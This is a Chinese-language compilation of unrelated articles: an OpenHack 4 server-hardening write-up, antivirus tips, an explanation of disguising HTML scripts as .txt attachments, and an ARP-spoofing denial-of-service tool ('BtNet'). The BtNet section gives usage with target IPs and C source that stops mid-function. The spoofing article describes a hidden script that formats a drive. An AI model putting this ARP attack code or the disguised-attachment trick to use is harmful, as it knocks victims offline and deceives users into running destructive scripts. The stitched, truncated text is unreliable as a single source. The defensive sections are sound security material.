使用 Windows 2000/XP 数据保护 API (DPAPI) 函数 CryptProtectData 和 CryptUnprotectData 将数据库连接字符串加密，使用这两个函数可以将机密信息加密，而无需直接管理（或存储）随后用于访问这些机密信息的注册表项。 
尽管 DPAPI 非常适合用于加密用户或计算机特定数据，但对于加密存储在共享数据库中的信息（如信用卡号码和密码），却不是一种很有效的方法。这是因为 DPAPI 函数根据本地计算机和/或用户信息创建和内部存储加密密钥。在 Web 领域方案中，Web 服务器将使用自己的加密密钥，以防它们访问相同的加密数据。 
因此，为了演示 Web 领域方案中使用的方法，生成了一个随机的 Triple DES 加密密钥和初始化向量。此功能是用 .NET Framework 的 System.Security.Cryptography 类中的 TripleDES 类提供的。这些密钥用于对称地加密存储在数据库中的密码和信用卡信息。为了存储信用卡信息，选择了加密性很强的随机第一块作为处理技术。 
生成密钥的备份副本后，我们使用 DPAPI 将其加密并存储到注册表中，然后又使用 ACL 将访问权限仅授予系统管理员和 ASPNET 辅助进程。将密钥加密，可确保当攻击者实际定位并访问数据时，如果不先将密钥解密，便无法解密数据。这是“层层设防”的又一个典型例子。 
Internet 信息服务 (IIS) 5.0 
为了防止攻击者攻击 Web 服务器本身，我们对 Windows 2000 Advanced Server 中的 Internet 信息服务 (IIS) 5.0 Web 服务器进行了适当的更改。首先，安装了 TechNet Web 站点上列出的所有公用安全性修补程序，以确保拥有最新的增强功能。运行任何软件时，安装最新的 Service Pack 和修补程序是一种非常关键的安全方案。 
然后，将磁盘上的默认 Web 站点位置从默认位置 c:\inetpub\ 更改到其他卷。因此，一旦系统在某些方面遭到破坏，攻击者将很难导航到此目录树，除非确实了解此目录树的实际位置，也就是说，攻击者无法通过输入 ..\ 作为位置说明来轻松地访问 C: 驱动器。 
接着，使用静态 Web 服务器附带的模板运行 IIS 锁定工具。此操作删除了此应用程序中未使用的所有其他动态内容类型。以这种方式减少暴露给潜在攻击者的表面区域通常是很重要的最佳方案。可以免费获得 IIS Lockdown Tool。它是一个很出色的资源，所有运行 IIS 的系统管理员都应该使用它。 
此时，我们已经安装了 .NET Framework Redistributable（它是运行 .NET Framework 应用程序所必需的）、.NET Framework Service Pack 2、最新的 .NET Framework 问题更正和 MDAC 2.7（.NET Framework 所需的组件）。 
在此方案中，应用程序只使用带有 .aspx 扩展名的动态文件和几个用于图像与样式表的静态内容类型。由于不需要 .NET Framework 安装的其他 IIS 应用程序映射，因此将这些扩展重新绑定到 IIS 锁定工具附带的 404.dll 扩展。这样做也是为了减少解决方案暴露的表面区域。 
此应用程序使用低权限的默认本地服务帐户（ASPNET 帐户）运行 ASP.NET 代码。“最低权限”原则对于所有管理人员来说都很重要，决不要向帐户授予并非绝对需要的权限。以这种方式锁定解决方案相当于减少暴露的表面区域。 
（ASPNET 帐户是在安装 .NET Framework Redistributable 时作为本地帐户创建的，只属于创建该帐户的计算机上的“用户”组。因此它拥有所有与此“用户”组相关的权限，并可与此用户组有权访问的任何资源进行交互。此外，它在默认情况下拥有对 Temporary ASP.NET Files 目录和 %windir%\temp 的完全访问权限，以及对 Framework 安装目录的读取权限。） 
我们将此 ASPNET 帐户添加到 IIS 锁定工具创建的本地“Web 应用程序组”，以防进程在被偷袭时运行任何未得到授权的命令行可执行程序。 
然后，我们修改了此用户组的权限，并允许此用户组中的用户运行应用程序需要的 .NET Framework C# 编译器和资源转换器（Csc.exe 和 Cvtres.exe）。 
IIS 锁定工具安装了 URLScan 2.5，它是一个 ISAPI 过滤器，可根据查询长度和字符集等规则监视和过滤发送到 IIS Web 服务器的所有输入请求。将 URLScan 配置成只允许应用程序中使用的扩展集，并用它阻止较长的请求。这是深度防护的另一个示例，它是防止通过用户输入插入恶意代码的额外保护层。TechNet 和 IIS 锁定工具中免费提供了 URLScan。与前面提到的 IIS 锁定工具一样，URLScan 是一种很出色的资源，所有运行 IIS 的系统管理员都应该使用它。 
我们为 Web 内容目录设置了适当的权限，从而授予 ASP.NET 进程对内容文件的读访问权限，授予匿名用户对所提供内容的适当只读访问权限。 
只有系统帐户和系统管理员组的成员才对 IIS 和 URLScan 的日志目录具有访问权限。限制对日志文件的访问通常很有必要，它使攻击者很难对其进行更改，以覆盖其中的记录或隐藏有关所受攻击的有用信息。 
Windows 2000 Advanced Server 操作系统 
本次竞赛使用的服务器全部运行安装了 Service Pack 3（它是竞赛时最新的 Service Pack）的 Windows 2000 Advanced Server 操作系统。还安装了自 Service Pack 3 发行以来 TechNet Web 站点上发布的所有安全性修补程序。使用最新的安全性修补程序对系统管理员同样是一个很重要的最佳安全方案。 
安装这些更新会对某些配置进行更改，从而进一步增强操作系统级的完整性。首先，禁用了所有不必要的操作系统服务，这通常也是一个最佳方案。通过关闭这些服务，可以释放系统资源并减少暴露给攻击者的表面区域。可以禁用的特定服务将随每个解决方案的需要而变化。Messenger、Alerter 和 ClipBook 只是已禁用服务的几个示例。 
强烈建议您阅读 Windows 2000 Server Resource Kit，以帮助确定不需要的服务。然后进行相应的测试，以确保应用程序在没有这些服务的情况下也能正常工作。最后，将这些服务的启动状态更改为 disabled 以关闭它们。 
在应用程序中，我们还使用注册表编辑器 (Regedit.exe) 更改了四个注册表设置，以便进一步增强安全性。我们将所有这些都作为最佳方案推荐给您，只要您不需要已禁用的功能即可。 
创建注册表项：nolmhash 
（需要说明的是，在 Windows 2000 中，这是一个关键字，而在 Windows XP 和 Windows Server 2003 中，这是一个值。） 
位置：HKLM\System\CurrentControlSet\Control\LSA 
用途：防止操作系统以 LM 散列格式存储用户密码。此格式只用于不支持 NTLM 或 Kerberos 的 Windows 3.11 客户端。创建和保留此 LM 散列的风险在于，如果攻击者设法将以此格式存储的密码解密，就可以在网络上的其他计算机上重复利用这些密码。 
创建注册表值：NoDefaultExempt 
位置：HKLM\System\CurrentControlSet\Services\IPSEC 
用途：默认情况下，IPSec 将允许源端口为 88 的传入通信查询 IPSec 服务，以获取连接到计算机的信息，而不管使用的是哪种 IPSec 策略。通过设置此值，除了我们设置的 IPSec 过滤器允许的通信（详见 IPSec 策略一节的介绍）以外，不允许端口之间进行任何通信。 
创建注册表值：DisableIPSourceRouting 
位置：HKLM\System\CurrentControlSet\Services\Tcpip\Parameters 
用途：防止 TCP 数据包显式确定到最终目标的路由，并防止它要求服务器确定最佳路由。这是一个防止“人在中间”攻击（即攻击者通过自己的服务器对数据包进行路由，并在数据包传递期间窃取其中的内容）的保护层。 
创建注册表值：SynAttackProtect 
位置：HKLM\System\CurrentControlSet\Services\Tcpip\Parameters 
用途：此注册表项通过限制分配给传入请求的资源来防止操作系统受到某种 SYN-flood 的攻击。换句话说，这将帮助阻止在客户端和服务器之间试图使用 SYN（即同步）请求以拒绝服务的攻击。 
另外，尽管与防止攻击没有直接关系，我们还启用了几个审核日志以覆盖登录和注销事件、帐户管理、策略更改和系统事件。这有助于我们在竞赛中更好地监视服务器。 
IP 安全标准 (IPSec) 策略 
从 Windows 2000 开始，Microsoft 已经使用 IP 安全标准 (IPSec)（IPv4 协议的扩展）为管理 Internet 协议 (IP) 通信的身份验证和加密提供支持。下面的图 1 显示了“服务器(请求安全设置)属性”对话框的默认策略。我们特地为竞赛创建了一种策略。
IPSec 规则是在 Microsoft 管理控制台 (MMC) 管理单元的“本地安全设置”中进行配置的，如上所述。这些策略在增强和确保 OpenHack 服务器之间允许的通讯的安全性方面起到了主要作用。这些规则使我们能够通过以下方法，增强最低特权的最佳方案： 
要求在每个系统的 IPSec 策略中，明确且唯一地指定运行和管理应用程序所需的所有通信。 
要求使用证书对系统之间的通信进行身份验证。 
要求对用于管理的通信进行身份验证（使用证书）和加密。 
拒绝应用程序或系统管理未明确允许的所有通信，包括 ICMP 和 IP 通信（“默认拒绝”规则）。 
IPSec 规则有三个主要部分：标识由 IPSec 处理的通信的过滤器，过滤器找到这样的通信时要采取的操作，以及用于建立安全性关联的身份验证机制。如果要进行通信的两个系统没有用于标识通信的规则，两者之间也没有公用的身份验证机制，则它们将无法建立连接。 
使用 IPSec 锁定解决方案的第一步是完全了解不同系统之间的通信路径，以便建立适当的 IPSec 过滤器。应允许 Web 服务器与 SQL 服务器数据库进行通信；远程访问服务器应允许系统管理员使用虚拟专用网络 (VPN) 访问网络的管理段；管理服务器应授予 VPN 客户端创建 Windows 2000 终端服务客户端会话的权限（以便访问运行于远程计算机桌面上的应用程序）以及访问和复制文件以便在管理服务器上共享的权限；所有系统应允许管理服务器为其专用接口生成管理终端服务会话；最后，所有系统应能够访问管理系统上共享的特定文件。当系统之间所需的连接按每个端口进行映射时，我们便在每一个系统上创建了 IPSec 过滤器。 

然后，必须确定处理通信的方法，因为通信是由系统上的过滤器识别的。对于 OpenHack 4，我们定义了四个可以采取的操作（称为“过滤器操作”）： 
阻止通信。 
允许通信。 
身份验证和签名 - 使用证书对通信来源进行身份验证，使用数据包签名建立安全性关联。 
身份验证、签名和加密 - 使用证书对通信来源进行身份验证，使用加密和数据包签名建立安全性关联。 
阻止规则就是丢弃数据包。此规则与“默认拒绝”规则的功能相同，它意味着“如果我们未明确地允许通信，则禁止通信”。允许规则允许通信通过，而无需考虑通信来源。此功能用于允许公开访问 Web 应用程序。 
尽管使用证书对通信进行身份验证要求我们从公用的证书颁发机构 (CA) 生成并分发 IPSec 证书，但它却显著增强了系统进行安全通信的能力。值得注意的是，我们使用了一个独立的 CA。授予所有证书后，该 CA 将从网络中删除。如果生产时不再需要此 CA，请务必遵循此方法，因为这是减少解决方案表面区域的另一个好方法。 
使用 IPSec 证书能够确保源系统和目标系统的标识，包括访问远程访问服务器的远程系统管理员。通过配置策略以便使用 SHA1 散列对所有传输进行签名，可确保数据包在后端系统之间传递时不会被攻击者成功修改。 
我们使用 MD5 加密算法对管理服务器通信进行了加密。使用这种方法，即使攻击者能够破坏一个面向 Internet 系统的安全性，也无法窃取专用网络的通信。这就使得系统管理员能够安全地连接到实时的 Web 站点以进行应用程序更新。 
IPSec 使用具有最高优先权的专用规则来处理规则。因此，每个系统最初具有以下两个规则： 
阻止所有 IP 通信。 
阻止所有 ICMP 通信。 
然后，针对每个系统构建规则。向 Web 服务器和数据库服务器之间的通信提供“身份验证和签名”过滤器操作；向与管理服务器的通信赋予“身份验证、签名和加密”过滤器操作；将对 Web 站点的公开访问设置为允许访问。 
下面显示了使用 IPSec 建立的 OpenHack 4 应用程序的逻辑连接。 
远程管理与监视 
OpenHack 4 的部分要求是能够在竞赛过程中更新应用程序。这项功能是通过使用第 2 层隧道协议 (L2TP) 创建 VPN、终端服务和受限文件共享实现的。  
图 3：用于创建 VPN（终端服务）的 L2TP
首先，L2TP 需要 IPSec 证书以建立连接。我们用适当的证书配置了几个远程系统管理员计算机。然后为远程系统管理员创建启用了远程访问的帐户。 
为了建立 VPN 连接，系统管理员必须在系统上安装了 IPSec 证书以及远程访问帐户凭据。简而言之，IPSec 证书以不可导出的格式将证书的专用部分嵌入到本地计算机的证书存储区中。这意味着此证书将无法移植并在其他系统上使用。实际上，我们能够确保系统管理员只能在允许的远程管理工作站中使用 VPN 客户端帐户，从而将对解决方案的管理访问降低到最低程度。 
对 L2TP 会话进行身份验证后，系统管理员工作站将获得管理网络上的 IP 地址。建立到管理网络的 VPN 隧道后，系统管理员即可打开到管理服务器 OHTS 的终端服务会话，并可使用管理服务器上的“收件箱”和“发件箱”文件共享，以丢弃更改的站点内容或检索文件进行分析。所有系统都是独立的（即不属于某个域），因此将共享访问和终端服务会话配置成通过增强的不明显的密码（详见密码一节的介绍）使用系统上的本地帐户。所用的共享被限制为只允许对“发件箱”进行读操作和对“收件箱”进行写操作。 
大量的管理工作是在管理服务器“终端服务”会话中进行的。在此会话中，系统管理员将连接到任何其他系统的远程管理终端服务会话，从根本上“嵌套”终端服务会话。然后，可以连接到管理服务器上的“收件箱”和“发件箱”共享，并根据所服务的系统的需要丢弃或检索文件。支持这些管理功能的所有通信都需要使用 IPSec，如上所述。 
SQL Server 2000 
OpenHack SQL Server 2000 数据库运行在专用计算机上，这是一种“层层设防”措施。即使 Web 层崩溃，数据库及它所包含的所有信息仍会受到隔离和保护。 
如上所述，我们的解决方案使用集成的 Windows 身份验证连接到数据库。这是一种值得借鉴的方法，因为它不需要开发和安全存储用于访问数据库的密码。 
为了确保向后兼容，Windows 2000 和 Windows XP 支持几种类型的身份验证协议。由于只有实现 NTLMv2 身份验证的计算机才能访问我们的数据库服务器，因此强烈建议将 LAN 管理器身份验证级别更改为“仅限于 NTLMv2”。注意，使用其他配置，Windows 95、Windows 98 和带有 Service Pack 4 及更高版本的 Windows NT Server 4.0 也可以支持 NTLMv2。通过限制所支持的身份验证协议的数量，系统管理员最大限度地减少了暴露给攻击者的表面区域。   
使用 SQL Server 与使用 Windows 一样，我们需要小心地安装、配置和运行必要的服务，以减少暴露给潜在攻击者的数据库表面区域。对于 OpenHack，我们未安装升级工具、调试符号、复制支持、联机图书或 Dev 工具组件。 
该安装是在 NTFS 分区上进行的，因为它可以为 SQL Server 使用的文件和文件夹提供额外的基于 ACL 的安全保护。下一步，通常也是最关键的一步，是安装 SQL Server 2000 Service Pack 2 及所有最新的修补程序。 
在服务帐户为 localSystem 的计算机中通常可以找到 SQL Server 安装程序。尽管在锁定良好的专用网络中，这是可以接受的，但由于它是基础计算机上的管理帐户，因此仍具有远远超过 SQL Server 服务真正所需的权限。如果要求服务帐户能够访问网络资源（如备份到网络驱动器时、使用日志传送时或使用复制支持时），则最好选择低权限的域帐户。但如果您的环境不需要这些功能，则完全可以选择低权限的本地帐户。在本次竞赛中，由于不打算使用这些功能，而且为了坚持“最低权限”原则，我们使用了本地用户帐户。 
我们使用以下设置创建了一个新的 NT 本地用户帐户： 
创建了一个非常强大的密码（详见密码一节的介绍）。 
删除了使用户可更改其密码的功能。 
删除了“终端服务”访问。 
创建新用户帐户后，我们使用 SQL Server Enterprise Manager 更改了启动服务帐户信息，强制数据库服务以此用户的身份运行。 
为了坚持只运行所需服务的思想和最佳安全方案，我们使用 Services MMC 管理单元停止 Distributed Transaction Coordinator (MSDTC) 服务，并将其设置为手动启动，这样 OpenHack 数据库就不会运行事务，服务器本身也不会运行 COM+ 应用程序。这里我们看到在专用计算机上运行数据库服务器的另一个优势：比与其他服务器和服务并行运行的服务器具有更强的减少周围表面区域的能力。 
还可以通过禁用 SQL Server 代理和 Microsoft 搜索服务进一步减少表面区域，因为我们的数据库解决方案不需要此功能。 
下一步，由于更多考虑的是可靠性而非安全性问题，我们设置了 Microsoft SQL Server 服务本身的属性，并将恢复操作更改为出现故障后重新启动服务。这样做是为了在出现故障时尽量减少停机时间。 
图 6：将恢复操作更改为出现故障后重新启动服务
然后我们设置了 Server Network 实用程序，并将网络属性从“直接客户端广播”更改为“隐藏 SQL Server”。还删除了“命名管道”协议，因为我们只需要 TCP/IP。 
作为此配置的一部分，我们返回到前面的配置，为 SA 帐户设置了非常强大的密码。即使在 Windows 身份验证模式下运行，也建议采用这种做法。如果以后通过企业管理器工具或直接通过注册表从身份验证模式切换到混合模式，您希望确保系统是安全的（即使系统管理员当时忘记设置 SA 密码），也可以使用这种方法。在这种方法中，最好做最坏的打算。 
我们将默认的登录审核设置更改为 Failure。此操作将登录 SQL Server 数据库的所有失败尝试都写到错误日志和事件日志，该信息对识别攻击数据库的尝试非常有用。 
然后，我们删除了默认的 Northwind 和 Pubs 数据库，以减少暴露给潜在攻击的表面区域。 
完成所有步骤后，我们创建了最终解决方案中使用的 Awards 数据库。然后仔细检查表和存储过程，并确保与应用程序关联的帐户对存储过程只有执行权限，而对实际表没有任何权限。这使我们能够控制对存储过程的访问并限制对它的操作，而不必担心针对表直接运行的特殊 SQL 查询。此外，我们还确保了此帐户在 SQL Server 中没有任何其他的特权和权限。 
密码 
确保任何服务器安全性的关键一步是选择不会被轻易猜出的长而复杂的密码。理想情况下，一个出色的密码应至少包括以下四组字符中的三组：小写 a 至 z、大写 A 至 Z、数字 0 至 9，以及非字母数字符号（如“>”、“*”、“&”等）。为了尽可能保证安全，密码应由以上四组中的每一组字符以及使用 ALT 键生成的字符组成。利用这些字符集创建长度至少为八个字符的密码，可最大限度地降低攻击者推测出登录凭据的机会。这是 OpenHack 解决方案中的每个服务器都使用的方法，也是我们极力向您推荐的方法。 
小结 
确保 OpenHack 解决方案安全性所采取的所有步骤并非适用于每个 Web 解决方案。这些步骤也并不能代表开发人员和系统管理员在确保解决方案的安全性时应采取的所有方法。每个项目都具有独特性，需要开发人员和管理员一起找出潜在的攻击因素及预防措施。也就是说，OpenHack 4 表明上述建议非常有价值。即使它们不能全部直接应用到您的解决方案中，也应从中提取一些关键的好方案，以便在构建安全解决方案时以一种形式或另一种形式加以应用： 
1.在原始设计中考虑安全问题。这包括开发进程以采用最新的 Service Pack 和修补程序。 
2.总是安装最新的 Service Pack 和修补程序。 
3.总是使用复杂且不明显的密码。 
4.关闭所有不必要的功能以减少暴露给攻击者的表面区域。 
5.坚持“最低权限”原则。决不授予并非绝对必需的权限。 
6.预测可能发生的故障并总是采用“层层设防”以减少负面影响。 
7.使用 IIS 时，运行 IIS 锁定工具和 URLScan。 
8.验证所有输入数据。 
9.使用参数化的存储过程，而不是在数据库上生成动态查询
有效防御病毒的十大必作的步骤
1、用常识进行判断。
　　决不打开来历不明邮件的附件或你并未预期接到的附件。对看来可疑的邮件附件要自觉不予打开。千万不可受骗，认为你知道附件的内容，即使附件看来好象是.jpg文件 -- 因为Windows允许用户在文件命名时使用多个后缀，而许多电子邮件程序只显示第一个后缀，例如，你看到的邮件附件名称是wow.jpg，而它的全名实际是wow.jpg.vbs，打开这个附件意味着运行一个恶意的VBScript病毒，而不是你的.jpg察看器。
　　2、安装防病毒产品并保证更新最新的病毒定义码。
　　建议你至少每周更新一次病毒定义码，因为防病毒软件只有最新才最有效。需要提醒你的是，你所是购买的诺顿防病毒软件，不仅是更新病毒定义码，而且同时更新产品的引擎，这是与其它防病毒软件所不一样的。这样的好处在于，可以满足新引擎在侦破和修复方面的需要，从而有效地抑制病毒和蠕虫。例如，赛门铁克的所有产品中都有“实时更新”（LiveUpdate）功能。
　　3、首次安装防病毒软件时，一定要对计算机做一次彻底的病毒扫描。
　　当你首次在计算机上安装防病毒软件时，一定要花费些时间对机器做一次彻底的病毒扫描，以确保它尚未受过病毒感染。功能先进的防病毒软件供应商现在都已将病毒扫描做为自动程序，当用户在初装其产品时自动执行。4、插入软盘、光盘和其他可插拔介质前，一定对它们进行病毒扫描。
　　确保你的计算机对插入的软盘、光盘和其他的可插拔介质，及对电子邮件和互联网文件都会做自动的病毒检查。
　　5、不要从任何不可靠的渠道下载任何软件。
　　这一点比较难于做到，因为通常我们无法判断什么是不可靠的渠道。比较容易的做法是认定所有较有名气的在线图书馆未受病毒感染，但是提供软件下载的网站实在太多了，我们无法肯定它们一定都采取了防病毒的措施，所以比较保险的办法是对安全下载的软件在安装前先做病毒扫描。
　　6、警惕欺骗性的病毒。
　　如果你收到一封来自朋友的邮件，声称有一个最具杀伤力的新病毒，并让你将这封警告性质的邮件转发给你所有认识的人，这十有八九是欺骗性的病毒。建议你访问防病毒软件供应商，如赛门铁克的网站www.symantec.com/avcenter， 证实确有其事。这些欺骗性的病毒，不仅浪费收件人的时间，而且可能与其声称的病毒一样有杀伤力。
　　7、使用其它形式的文档，如.rtf（Rich Text format）和.pdf（Portable Document format）。
　　常见的宏病毒使用Microsoft Office的程序传播，减少使用这些文件类型的机会将降低病毒感染风险。尝试用Rich Text存储文件，这并不表明仅在文件名称中用.rtf后缀，而是要在Microsoft Word中，用“另存为”指令，在对话框中选择Rich Text形式存储。尽管Rich Text format依然可能含有内嵌的对象，但它本身不支持Visual Basic Macros或Jscript。而pdf文件不仅是跨平台的，而且更为安全。当然，这也不是能够彻底避开病毒的万全之计。8、不要用共享的软盘安装软件，或者更为糟糕的是复制共享的软盘。
　　这是导致病毒从一台机器传播到另一台机器的方式。同时，该软件没有注册也会被认为是非正版软件，而我们基本可以较为合理地推断，复制非法软件的人一般对版权法和合法使用软件并不在乎，同样，他们对安装和维护足够的病毒防护措施也不会太在意。盗版软件是病毒传染的最主要渠道。
　　9、禁用Windows Scripting Host。
　　Windows Scripting Host(WSH) 运行各种类型的文本，但基本都是VBScript或Jscript。换句话说，Windows Scripting Host在文本语言之间充当翻译的角色，该语言可能支持ActiveX Scripting界面，包括VBScript, Jscript或Perl，及所有Windows的功能，包括访问文件夹、文件快捷方式、网络接入和Windows注册等。许多病毒/蠕虫，如Bubbleboy和KAK.worm使用Windows Scripting Host，无需用户点击附件，就可自动打开一个被感染的附件。
　　10、使用基于客户端的防火墙或过滤措施。
　　如果你使用互联网，特别是使用宽带，并总是在线，那就非常有必要用个人防火墙保护你的隐私并防止不速之客访问你的系统。如果你的系统没有加设有效防护，你的家庭地址、信用卡号码和其它个人信息都有可能被窃取。
识别.txt文件欺骗方法
在众多媒体的宣传报道下，今天的我们都知道了不能轻易打开电子邮件里的可执行文件类的附件，但是显然那些破坏活动的制造者们也看了那些警告防范的文章，他们开始玩一些新的把戏，让您以为那些附件只不过是没有危险的文本文件或是图像文件等就是其手段之一。由于目前大多数人使用的是windows系列操作系统，windows的默认设置是隐藏已知文件扩展名的，而当你去点击那个看上去很友善的文件，那些破坏性的东西就跳出来了。您可能说这我早就知道了，那么下面讲述的.txt文件的新欺骗方法及原理您知道吗？
　　
　　假如您收到的邮件附件中有一个看起来是这样的文件：QQ靓号放送.txt，您是不是认为它肯定是纯文本文件？我要告诉您，不一定！它的实际文件名可以是QQ靓号放送.txt.{3050F4D8-98B5-11CF-BB82-00AA00BDCE0B}。{3050F4D8-98B5-11CF-BB82-00AA00BDCE0B}在注册表里是HTML文件关联的意思。但是存成文件名的时候它并不会显现出来，您看到的就是个.txt文件，这个文件实际上等同于QQ靓号放送.txt.html。那么直接打开这个文件为什么有危险呢？请看如果这个文件的内容如下：
　　
　　您可能以为它会调用记事本来运行，可是如果您双击它，结果它却调用了HTML来运行，并且自动在后台开始格式化d盘，同时显示“Windows is configuring the system。Plase do not interrupt this process。”这样一个对话框来欺骗您。您看随意打开附件中的.txt的危险够大了吧？
　　
　　欺骗实现原理：当您双击这个伪装起来的.txt时候，由于真正文件扩展名是.{3050F4D8-98B5-11CF-BB82-00AA00BDCE0B}，也就是.html文件，于是就会以html文件的形式运行，这是它能运行起来的先决条件。
　　
　　文件内容中的第2和第3行是它能够产生破坏作用的关键所在。其中第3行是破坏行动的执行者，在其中可以加载带有破坏性质的命令。那么第2行又是干什么的呢？您可能已经注意到了第2行里的“WSCript”，对！就是它导演了全幕，它是实际行动总指挥。
　　
　　WScript全称Windows Scripting Host，它是Win98新加进的功能, 是一种批次语言/自动执行工具——它所对应的程序“WScript.exe”是一个脚本语言解释器，位于c:\WINDOWS下，正是它使得脚本可以被执行，就象执行批处理一样。在Windows Scripting Host脚本环境里，预定义了一些对象，通过它自带的几个内置对象，可以实现获取环境变量、创建快捷方式、加载程序、读写注册表等功能。
　　
　　下面我们通过一个小例子来说明Windows Scripting Host功能是如何的强大，使用又是怎样的简单，被有心人利用后的威胁有多大。例如有内容如下的*.vbs文件： 
Set so=CreateObject("Scripting.FileSystemObject") 
　　so.GetFile(c:\windows\winipcfg.exe).Copy("e:\winipcfg.exe") 
　　 
　　就是这么两行就可以拷贝文件到指定地点。第一行是创建一个文件系统对象，第二行前面是打开这个脚本文件，c:\windows\winipcfg.exe指明是这个程序本身，是一个完整的路径文件名。GetFile函数获得这个文件，Copy函数将这个文件复制到e盘根目录下。这也是大多数利用VBscript编写的病毒的一个特点。从这里可以看出，禁止了FileSystemObject这个对象就可以很有效的控制这种病毒的传播。用regsvr32 scrrun.dll /u这条命令就可以禁止文件系统对象。
　　
　　欺骗识别及防范方法：这种带有欺骗性质的.txt文件显示出来的并不是文本文件的图标，它显示的是未定义文件类型的标志，这是区分它与正常.txt文件的最好方法。识别的另一个办法是在“按WEB页方式”查看时在“我的电脑”左面会显示出其文件名全称，此时可以看到它不是真正的txt文件。问题是很多初学者经验不够，老手也可能因为没留意而打开它，在这里再次提醒您，注意您收到的邮件中附件的文件名，不仅要看显示出来的扩展名，还要注意其实际显示的图标是什么。对于附件中别人发来的看起来是.txt的文件，可以将它下载后用鼠标右键选择“用记事本打开”，这样看会很安全。
　　
　　好了，现在您知道.txt文件也不能轻易打开了吧？您知道了？OK，我写这篇文章的目的达到了！
基于arp欺骗的网络攻击程序
最近开始学WINPCAP，看了很多高手写的基于arp欺骗的抓包工具，尤其是电子科大的TOo2y师兄的《详谈调用winpcap驱动写arp多功能工具》，令我收益非浅。下面是我把这个思想改成arp攻击程序(可令目标主机断开网络连接)的一些测试。高手请略过，以免有班门弄斧之闲。
一般的arp spoof是向被欺骗主机发送ARP REPLY数据报,把其中的源IP地址置为被欺骗主机要发包去的主机地址，源MAC地址却改为自己的MAC地址。假设有两台机器A,B，发送一个ARP REPLY数据报给A,其中源IP地址为B的地址,源MAC地址为我的机器的MAC地址(IPRouter功能打开确保数据被转发)，那么A发送到B的数据报就发到我的机器上了，同样对B做相同到操作，那么A<==>B之间的数据就会源源不断的通过我的机器转发，直到一个正常的ARP包更改了A,B的arp缓存为止。
那么我们把发送给A的arp数据报的源IP,源MAC更改成任意的，会出现什么现象？下面是我的几个测试
1. 源IP更改为网关IP,源MAC改为不存在的MAC地址
对目标主机几乎不影响
2. 源IP更改为网关IP,源MAC改为内网内任意一台存在但没有开启IPRouter的主机的MAC地址
几乎不影响 
3. 源IP更改为网关IP,源MAC改为目标主机的MAC
目标主机立刻断网! 
可见当发送经过我们构造的ARP REALY包给目标主机时,会使目标主机的ARP缓存更改，数据封装到MAC层的时候会把网关的IP和自己的MAC地址封装到一起，那么发送到网关的数据报只好发给自己了，呵呵。
至于第1种情况，猜想大概是由于MAC地址不存在,目标主机会广播一个ARP REQUEST包而更新了自己的ARP缓存所致。
至于第2种情况，猜想源MAC地址所属主机会返回一个ARP REPLY给目标主机。
水平有限，所以只是猜想，知道的请告诉我一声，先谢过了。
再说一下，以上测试只对于windows系统，当然也测试过对没有配置好的Red Hat成功过。
测试程序(BtNet.exe)说明：
Usage: BtNet -h attackIP -o gateIP [-m spoofedMAC]
-m参数是你要修改的源MAC地址.
为了隐蔽攻击者身份，程序再得到目标主机MAC地址时伪装成IP:128.128.128.128,MAC:a5-a5-a5-a5-a5-a5，可能会得不到目标主机的MAC地址，那么要得到MAC地址请借助第三方工具。
附测试程序代码
#include "packet32.h"
#include "ntddndis.h"
#include <stdio.h>
#include <conio.h>
#include <winsock2.h>
#include <windows.h>
#pragma comment(lib,"ws2_32")
#pragma comment(lib,"packet")
#define ETH_IP 0x0800
#define ETH_ARP 0x0806
#define ARP_REQUEST 0x0001 //arp请求包
#define ARP_REPLY 0x0002 //arp应答包
#define ARP_HARDWARE 0x0001
#define max_num_adapter 10
#pragma pack(push,1)
typedef struct ethdr
{
unsigned char eh_dst[6]; //以太网目的地址
unsigned char eh_src[6]; //以太网源地址
unsigned short eh_type; //
}ETHDR,*PETHDR;
typedef struct arphdr //arp头
{
unsigned short arp_hdr; //硬件类型
unsigned short arp_pro; //协议类型
unsigned char arp_hln; //硬件地址长度
unsigned char arp_pln; //协议地址长度
unsigned short arp_opt; //
unsigned char arp_sha[6]; //发送端以太网地址
unsigned long arp_spa; //发送端ip地址
unsigned char arp_tha[6]; //接收端以太网地址
unsigned long arp_tpa; //接收端ip地址
}ARPHDR,*PARPHDR;
typedef struct ip_mac
{
u_long ip;
unsigned char mac[6];
}IP_MAC,*PIP_MAC;
#pragma pack(push)
LPADAPTER lpAdapter;
char adapterlist[max_num_adapter][1024];
IP_MAC toipandmac;
IP_MAC oipandmac,myipandmac;
BOOL param6=FALSE;
char *noMACstr;
char noMAC[6][3];
u_long mytoIP,oIP;
BOOL sendtoOip;
MSG msg;
UINT newtimer;
char MYIP[20]="128.128.128.128";
BOOL toipandmac_flag=FALSE,myipandmac_flag=FALSE,oipandmac_flag=FALSE;
int getint(char c)
{
int t=-1;
if((c<='9')&&(c>='0'))
t=c-'0';
else if((c>='a')&&(c<='f'))
t=10+c-'a';
else if((c>='A')&&(c<='F'))
t=10+c-'A';
return t;
}
void start()
{
printf("BtNet //--an ARP Tool test the Windows Break the Internet\n");
printf("written by Ruder,10/2003\n");
printf("Homepage: http://xEyes.cdut.net/ruder/index.htm\;n");
printf("E-mail: cocoruder@163.com\n");
printf("\nUsage: BtNet -h attackIP -o gateIP [-m spoofedMAC]\n");
printf("Example:\n");
printf("BtNet -h 202.115.138.12 -o 202.115.138.1\n");
printf("BtNet -h 202.115.138.12 -o 202.115.138.1 -m 00-50-fc-6a--6b--7c\n");
printf(" Warning: You must have installed the winpcap_2.3 or winpcap_3.0_alpha\n");
return ;
}
DWORD WINAPI sniff(LPVOID)
{
LPPACKET lppackets,lpPacketr;
char recvbuf[1024*250];
ULONG ulbytesreceived,off;
ETHDR *eth;
ARPHDR *arp;
char *buf,*pChar,*base;
char szTemp[20];
struct bpf_hdr *hdr;
if((lppackets=PacketAllocatePacket())==FALSE)
{
printf("PacketAllocatePacket send Error: %d\n",GetLastError());
return 0;
}
if(PacketSetHwFilter(lpAdapter,NDIS_PACKET_TYPE_PROMISCUOUS)==FALSE)
{
printf("Warning: Unable to set the adapter to promiscuous mode\n");
}
if(PacketSetBuff(lpAdapter,500*1024)==FALSE)
{
printf("PacketSetBuff Error: %d\n",GetLastError());
return 0;
}
if(PacketSetReadTimeout(lpAdapter,1)==FALSE)
{
printf("Warning: Unable to set the timeout\n");
}
if((lpPacketr=PacketAllocatePacket())==FALSE)
{
printf("PacketAllocatePacket receive Error: %d\n",GetLastError());
return 0;
}
PacketInitPacket(lpPacketr,(char *)recvbuf,sizeof(recvbuf));
while(!kbhit())
{
if(PacketReceivePacket(lpAdapter,lpPacketr,TRUE)==FALSE)
{
return 0;
